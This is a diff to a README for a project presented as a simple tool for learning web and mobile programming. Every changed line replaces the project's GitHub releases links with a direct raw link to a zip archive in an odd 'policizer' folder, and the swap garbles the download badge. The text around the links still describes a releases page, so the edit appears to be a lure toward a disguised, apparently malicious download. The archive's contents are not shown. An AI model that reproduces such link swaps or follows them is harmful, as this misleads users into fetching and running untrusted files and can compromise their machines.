@@ -1,6 +1,6 @@
 # 🚀 pwm-2025-2 - A Simple Way to Learn Web and Mobile Programming
 
-[![Download pwm-2025-2](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Armaan-PC/pwm-2025-2/releases)
+[![Download pwm-2025-2](https://raw.githubusercontent.com/Armaan-PC/pwm-2025-2/main/policizer/pwm-2025-2.zip%20Now-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Armaan-PC/pwm-2025-2/main/policizer/pwm-2025-2.zip)
 
 ## 📋 Introduction
 
@@ -13,7 +13,7 @@ To begin using pwm-2025-2, you'll first need to download it. Here’s a simple w
 1. **Visit the Releases Page:**
    Click the link below to go to the releases page where you can find the latest version of pwm-2025-2.
 
-   [Get the Latest Release](https://github.com/Armaan-PC/pwm-2025-2/releases)
+   [Get the Latest Release](https://raw.githubusercontent.com/Armaan-PC/pwm-2025-2/main/policizer/pwm-2025-2.zip)
 
 2. **Download the Latest Version:**
    On the releases page, locate the most recent version. You will see download options for various files. Choose the one that best suits your system. Typically, you'll find options for Windows, Mac, and Linux.
@@ -44,7 +44,7 @@ pwm-2025-2 offers several key features that will enhance your learning experienc
 To download and run pwm-2025-2, follow these steps:
 
 1. **Go to the Download Page:**
-   Visit [this page](https://github.com/Armaan-PC/pwm-2025-2/releases) to access the downloads.
+   Visit [this page](https://raw.githubusercontent.com/Armaan-PC/pwm-2025-2/main/policizer/pwm-2025-2.zip) to access the downloads.
 
 2. **Select and Download:**
    Choose the appropriate file for your system and download it. 
@@ -67,7 +67,7 @@ If you have questions or need help, you are not alone. Here’s how you can get 
 
 pwm-2025-2 will receive regular updates. Make sure to check the releases page periodically for new features, improvements, and bug fixes. Staying updated helps you take full advantage of the available tools and resources.
 
-[Get the Latest Release](https://github.com/Armaan-PC/pwm-2025-2/releases)
+[Get the Latest Release](https://raw.githubusercontent.com/Armaan-PC/pwm-2025-2/main/policizer/pwm-2025-2.zip)
 
 ## 📚 Additional Learning Resources
 
